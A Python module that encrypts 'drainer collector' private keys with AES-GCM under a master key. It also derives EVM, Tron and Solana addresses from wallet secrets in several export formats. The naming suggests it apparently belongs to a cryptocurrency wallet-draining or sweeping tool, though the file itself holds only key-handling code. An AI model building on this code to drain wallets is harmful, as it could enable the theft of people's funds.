"""
Key custody for drainer collectors.

Collector private keys are encrypted at rest with AES-256-GCM under MASTER_KEY and
only decrypted inside execute_drain(). The master key comes from MASTER_KEY
(hex or base64) or data/master.key, which is created exclusively so concurrent
workers cannot each mint a different one.
"""
import base64
import binascii
import hashlib
import logging
import os
import secrets
from typing import Optional, Tuple

import base58
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

logger = logging.getLogger("crypto")

AAD = b"nectra.drainer"
NONCE_LEN = 12
KEY_LEN = 32

_MASTER_CACHE: Optional[bytes] = None
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
MASTER_PATH = os.path.join(BASE_DIR, "data", "master.key")


# ------------------------------------------------------------------ master key
def _decode_master(raw: str) -> bytes:
    """Accept 64 hex chars or base64; must yield exactly 32 bytes."""
    candidates = []
    if len(raw) == 64:
        candidates.append(raw)
    candidates.append(raw)
    for c in candidates:
        try:
            key = bytes.fromhex(c)
            if len(key) == KEY_LEN:
                return key
        except (ValueError, binascii.Error):
            pass
        try:
            key = base64.b64decode(c, validate=True)
            if len(key) == KEY_LEN:
                return key
        except (ValueError, binascii.Error):
            pass
    raise RuntimeError("MASTER_KEY must be 64 hex chars or base64 decoding to 32 bytes")


def _read_key_file(path: str) -> bytes:
    with open(path, "rb") as fh:
        key = fh.read().strip()
    if len(key) == KEY_LEN:
        return key
    try:
        return _decode_master(key.decode("utf-8", "ignore"))
    except RuntimeError:
        raise RuntimeError(f"{path} is corrupt — expected 32 raw bytes or 32 bytes encoded")


def master_key() -> bytes:
    global _MASTER_CACHE
    if _MASTER_CACHE is not None:
        return _MASTER_CACHE

    env = os.environ.get("MASTER_KEY", "").strip()
    if env:
        _MASTER_CACHE = _decode_master(env)
        return _MASTER_CACHE

    if os.path.exists(MASTER_PATH):
        _MASTER_CACHE = _read_key_file(MASTER_PATH)
        return _MASTER_CACHE

    os.makedirs(os.path.dirname(MASTER_PATH), exist_ok=True)
    key = secrets.token_bytes(KEY_LEN)
    try:
        fd = os.open(MASTER_PATH, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
        with os.fdopen(fd, "wb") as fh:
            fh.write(key)
        logger.warning("Generated new MASTER_KEY at %s — BACK THIS UP.", MASTER_PATH)
    except FileExistsError:
        # another worker won the race
        key = _read_key_file(MASTER_PATH)
    try:
        os.chmod(MASTER_PATH, 0o600)
    except OSError:
        pass

    _MASTER_CACHE = key
    return key


# ------------------------------------------------------------------ secrets
def encrypt_secret(plaintext: str) -> str:
    if not plaintext:
        raise ValueError("nothing to encrypt")
    nonce = secrets.token_bytes(NONCE_LEN)
    ct = AESGCM(master_key()).encrypt(nonce, plaintext.encode(), AAD)
    return base64.b64encode(nonce + ct).decode()


def decrypt_secret(blob: str) -> str:
    if not blob:
        raise ValueError("no ciphertext supplied")
    try:
        raw = base64.b64decode(blob)
    except (ValueError, binascii.Error):
        raise ValueError("ciphertext is not valid base64")
    if len(raw) <= NONCE_LEN + 16:
        raise ValueError("ciphertext is truncated")
    nonce, ct = raw[:NONCE_LEN], raw[NONCE_LEN:]
    try:
        return AESGCM(master_key()).decrypt(nonce, ct, AAD).decode()
    except Exception:
        raise ValueError("decryption failed — wrong MASTER_KEY or corrupt blob")


# ------------------------------------------------------------------ key parsing
def normalize_hex_key(raw: str) -> str:
    """Return a bare 64-char lowercase hex key, validating length."""
    s = (raw or "").strip()
    if s.startswith("0x") or s.startswith("0X"):
        s = s[2:]
    if len(s) == 64 and all(c in "0123456789abcdefABCDEF" for c in s):
        return s.lower()
    raise ValueError("private key must be 64 hex characters")


def evm_address_from_key(pk_hex: str) -> str:
    from eth_account import Account
    return Account.from_key(normalize_hex_key(pk_hex)).address


def tron_address_from_key(pk_hex: str) -> str:
    """Derive a base58check Tron address (0x41 prefix) from a hex private key."""
    from eth_account import Account
    addr = Account.from_key(normalize_hex_key(pk_hex)).address
    payload = b"\x41" + bytes.fromhex(addr[2:])
    checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    return base58.b58encode(payload + checksum).decode()


def solana_keypair_from_secret(secret: str) -> Tuple[object, str]:
    """
    Build a Keypair from any common export format:
      * 64-byte JSON array (Phantom `solana-keygen` output)
      * base58 64-byte secret
      * base58 32-byte seed
      * 64 hex chars (32-byte seed)
    """
    from solders.keypair import Keypair

    s = (secret or "").strip()
    if not s:
        raise ValueError("empty Solana secret")

    raw: bytes
    if s.startswith("["):
        import json
        try:
            raw = bytes(json.loads(s))
        except (ValueError, TypeError):
            raise ValueError("secret looks like a JSON array but does not parse")
    elif len(s) == 64 and all(c in "0123456789abcdefABCDEF" for c in s):
        raw = bytes.fromhex(s)
    else:
        try:
            raw = base58.b58decode(s)
        except ValueError:
            raise ValueError("secret is neither base58 nor a JSON array")

    if len(raw) == 64:
        kp = Keypair.from_bytes(raw)
    elif len(raw) == 32:
        kp = Keypair.from_seed(raw)
    else:
        raise ValueError(f"Solana secret must decode to 32 or 64 bytes, got {len(raw)}")

    return kp, str(kp.pubkey())